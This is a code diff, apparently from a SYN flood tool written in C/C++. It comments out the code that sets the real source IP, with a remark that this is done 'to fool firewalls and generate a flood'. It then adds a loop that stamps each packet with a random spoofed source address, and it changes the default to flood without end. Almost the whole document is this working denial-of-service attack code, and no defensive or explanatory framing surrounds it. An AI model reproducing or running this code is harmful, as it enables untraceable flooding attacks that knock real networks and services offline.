@@ -37,8 +37,11 @@ int init_syn_packet(syn_header_t &syn_header, global_config_t &config) {
      * set in the end.
      * => syn_header.ip_header.check = ***
      */
+    /*
+     * this field is set outside to fool firewalls and generate a flood.
+     *
     char source_ip[INET_ADDRSTRLEN];
-    if (strlen(config.eth) == 0) { /* eth not set, use local ip address */
+    if (strlen(config.eth) == 0) { // eth not set, use local ip address 
         if (NULL != get_primary_ip(source_ip, INET_ADDRSTRLEN)) {
             struct in_addr saddr;
             inet_pton(AF_INET, source_ip, &saddr);
@@ -47,7 +50,7 @@ int init_syn_packet(syn_header_t &syn_header, global_config_t &config) {
             SF_SYSLOG("get_primary_ip() failed.");
             return -1;
         }
-    } else { /* eth set, use specified eth ip address */
+    } else { // eth set, use specified eth ip address 
         if (NULL != get_ethernet_ip(config.eth, source_ip, INET_ADDRSTRLEN)) {
             struct in_addr saddr;
             inet_pton(AF_INET, source_ip, &saddr);
@@ -56,7 +59,7 @@ int init_syn_packet(syn_header_t &syn_header, global_config_t &config) {
             SF_SYSLOG("get_ethernet_ip() failed.");
             return -1;
         }
-    }
+    } */
 
     char dest_ip[INET_ADDRSTRLEN];
     in_addr daddr;
@@ -275,16 +278,22 @@ int syn_flood() {
         return -1;
     }
 
-    uint16_t ip_packet_id = 0xAAAA; /* unique id of IP packet, increase by 1 */
-    uint32_t tcp_syn_seq = time(0); /* unique sequence number of TCP SYN packet, increase by 10 */
-    int packets = 1;
+    uint16_t ip_packet_id = 0; /* unique id of IP packet, increase by 1 */
+    uint32_t tcp_syn_seq = 0; /* unique sequence number of TCP SYN packet, increase by 1 */
+    int packets = 0; /* continue flooding */
     if (g_config.packets > 0)
         packets = g_config.packets;
-    for (int i = 0; i < packets; ++i) {
+    struct in_addr saddr;
+    char src_ip[INET_ADDRSTRLEN];
+    for (int i = 0; packets == 0 || i < packets; ++i) {
+        srandom(i);
+        sprintf(src_ip, "%d.%d.%d.%d", random() % 255, random() % 255, random() % 255, random() % 255);
+        inet_pton(AF_INET, src_ip, &saddr);
+        syn_header.ip_header.saddr = saddr.s_addr;
         syn_header.ip_header.id = htons(ip_packet_id + i);
         syn_header.ip_header.check = 0;
         syn_header.ip_header.check = checksum((uint16_t *)&syn_header.ip_header, sizeof(syn_header.ip_header));
-        syn_header.tcp_header.th_seq = htonl(tcp_syn_seq + 10 * i);
+        syn_header.tcp_header.th_seq = htonl(tcp_syn_seq + i);
         syn_header.tcp_header.th_sum = 0;
         syn_header.tcp_header.th_sum = tcp4_checksum(syn_header.ip_header, syn_header.tcp_header);
 
